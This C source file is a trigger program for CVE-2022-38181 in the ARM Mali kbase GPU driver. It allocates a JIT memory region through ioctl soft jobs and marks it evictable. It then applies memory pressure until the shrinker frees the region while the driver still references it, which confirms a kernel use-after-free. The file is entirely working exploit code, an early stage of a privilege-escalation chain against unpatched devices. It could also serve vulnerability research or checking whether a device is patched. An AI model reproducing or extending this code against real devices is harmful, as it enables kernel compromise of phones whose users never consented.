/* CVE-2022-38181 full trigger for trona (kbase r14p0, UAPI 11.11)
 * Milestone: prove JIT region can be made evictable and freed by the
 * shrinker while jit_alloc[] still references it.
 */
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <poll.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

typedef unsigned int __u32;
typedef unsigned short __u16;
typedef unsigned long long __u64;
typedef unsigned char __u8;

#include "mali_trona.h"

struct kbase_ioctl_mem_jit_init { __u64 va_pages; __u8 max_allocations; __u8 trim_level; __u8 padding[6]; };
#define KBASE_IOCTL_MEM_JIT_INIT _IOW(0x80, 14, struct kbase_ioctl_mem_jit_init)

struct kbase_ioctl_job_submit { __u64 addr; __u32 nr_atoms; __u32 stride; };
#define KBASE_IOCTL_JOB_SUBMIT _IOW(0x80, 2, struct kbase_ioctl_job_submit)

union kbase_ioctl_mem_query {
	struct { __u64 gpu_addr; __u64 query; } in;
	struct { __u64 value; } out;
};
#define KBASE_IOCTL_MEM_QUERY _IOWR(0x80, 6, union kbase_ioctl_mem_query)
#define KBASE_MEM_QUERY_VA_SIZE ((__u64)2)

struct base_dependency { __u8 atom_id; __u8 dependency_type; };
struct base_jd_atom_v2 {
	__u64 jc; __u64 udata[2]; __u64 extres_list;
	__u16 nr_extres; __u16 compat_core_req;
	struct base_dependency pre_dep[2];
	__u8 atom_number, prio, device_nr, padding;
	__u32 core_req;
};

struct base_jit_alloc_info {
	__u64 gpu_alloc_addr; __u64 va_pages; __u64 commit_pages; __u64 extent;
	__u8 id, bin_id, max_allocations, flags; __u8 padding[2]; __u16 usage_id;
};

struct base_jd_event_v2 {
	__u32 event_code;	/* 1 = DONE */
	__u8  atom_number;
	__u8  _pad[3];
	__u64 udata[2];
};

#define BASE_JD_REQ_SOFT_JOB       ((__u32)1 << 9)
#define BASE_JD_REQ_SOFT_JIT_ALLOC (BASE_JD_REQ_SOFT_JOB | 0x9)

static int fd;

static int submit_atom(__u32 core_req, __u64 jc, __u16 nr_extres, __u8 id)
{
	struct base_jd_atom_v2 atom;
	memset(&atom, 0, sizeof(atom));
	atom.jc = jc; atom.nr_extres = nr_extres;
	atom.atom_number = id; atom.core_req = core_req;
	struct kbase_ioctl_job_submit js = { (__u64)&atom, 1, sizeof(atom) };
	return ioctl(fd, KBASE_IOCTL_JOB_SUBMIT, &js);
}

static int wait_atom(__u8 id)
{
	struct pollfd pfd = { fd, POLLIN, 0 };
	if (poll(&pfd, 1, 3000) <= 0) { printf("poll timeout/none\n"); return -1; }
	struct base_jd_event_v2 ev;
	int n = read(fd, &ev, sizeof(ev));
	if (n < (int)sizeof(ev)) { printf("short event read %d\n", n); return -1; }
	printf("    event: atom=%u code=0x%x\n", ev.atom_number, ev.event_code);
	return ev.event_code;
}

int main(void)
{
	struct kbase_ioctl_version_check vc = { 999, 999 };
	fd = open("/dev/mali0", O_RDWR);
	if (fd < 0) { perror("open"); return 1; }
	ioctl(fd, KBASE_IOCTL_VERSION_CHECK, &vc);
	printf("[*] UAPI %d.%d\n", vc.major, vc.minor);
	struct kbase_ioctl_set_flags sf = { 0 };
	if (ioctl(fd, KBASE_IOCTL_SET_FLAGS, &sf) < 0) { perror("SF"); return 1; }
	void *t = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, fd, BASE_MEM_MAP_TRACKING_HANDLE);
	if (t == MAP_FAILED) { perror("track"); return 1; }

	struct kbase_ioctl_mem_jit_init ji = { 0 };
	ji.va_pages = 0x40000; ji.max_allocations = 8; ji.trim_level = 0;
	if (ioctl(fd, KBASE_IOCTL_MEM_JIT_INIT, &ji) < 0) { perror("JIT_INIT"); return 1; }

	union kbase_ioctl_mem_alloc ma;
	memset(&ma, 0, sizeof(ma));
	ma.in.va_pages = ma.in.commit_pages = 1;
	ma.in.flags = BASE_MEM_SAME_VA | BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
		      BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR;
	if (ioctl(fd, KBASE_IOCTL_MEM_ALLOC, &ma) < 0) { perror("MEM_ALLOC wb"); return 1; }
	void *wb = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, fd, ma.out.gpu_va);
	if (wb == MAP_FAILED) { perror("mmap wb"); return 1; }
	*(__u64 *)wb = 0;
	printf("[*] init chain complete\n");

	struct base_jit_alloc_info info;
	memset(&info, 0, sizeof(info));
	info.gpu_alloc_addr = (__u64)wb;
	info.va_pages = 4096; info.commit_pages = 4096; info.extent = 4096;
	info.id = 1; info.max_allocations = 8;

	if (submit_atom(BASE_JD_REQ_SOFT_JIT_ALLOC, (__u64)&info, 1, 1) < 0) {
		perror("submit JIT_ALLOC"); return 1;
	}
	int ev = wait_atom(1);
	__u64 jit_va = *(__u64 *)wb;
	printf("[*] JIT_ALLOC event=0x%x jit_va=0x%llx\n", ev, jit_va);
	if (!jit_va) { printf("[-] alloc failed\n"); return 1; }

	/* THE GATE: mark JIT region evictable */
	struct kbase_ioctl_mem_flags_change fc;
	fc.gpu_va = jit_va;
	fc.mask   = BASE_MEM_FLAGS_MODIFIABLE | BASE_MEM_DONT_NEED;
	fc.flags  = BASE_MEM_FLAGS_MODIFIABLE | BASE_MEM_DONT_NEED;
	if (ioctl(fd, KBASE_IOCTL_MEM_FLAGS_CHANGE, &fc) < 0) {
		printf("[-] FLAGS_CHANGE(DONT_NEED) on JIT: %s\n"
		       "[-] CVE-2022-38181 PATCHED on this build\n", strerror(errno));
		return 3;
	}
	printf("[+] FLAGS_CHANGE(DONT_NEED) accepted on JIT region\n");

	printf("[*] applying memory pressure, watching MEM_QUERY...\n");
	union kbase_ioctl_mem_query q;
	for (int round = 0; round < 30; round++) {
		size_t sz = 64UL << 20;
		char *p = mmap(NULL, sz, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
		if (p == MAP_FAILED) { printf("    (mmap pressure failed)\n"); break; }
		memset(p, 1, sz);
		memset(&q, 0, sizeof(q));
		q.in.gpu_addr = jit_va; q.in.query = KBASE_MEM_QUERY_VA_SIZE;
		if (ioctl(fd, KBASE_IOCTL_MEM_QUERY, &q) < 0) {
			printf("[+] round %d: MEM_QUERY lost the region (%s)\n"
			       "[+] BUG CONFIRMED: JIT region reclaimed while jit_alloc[] references it\n",
			       round, strerror(errno));
			return 0;
		}
		printf("    round %d: va_size=%llu\n", round, q.out.value);
	}
	printf("[-] shrinker never reclaimed the region\n");
	return 2;
}
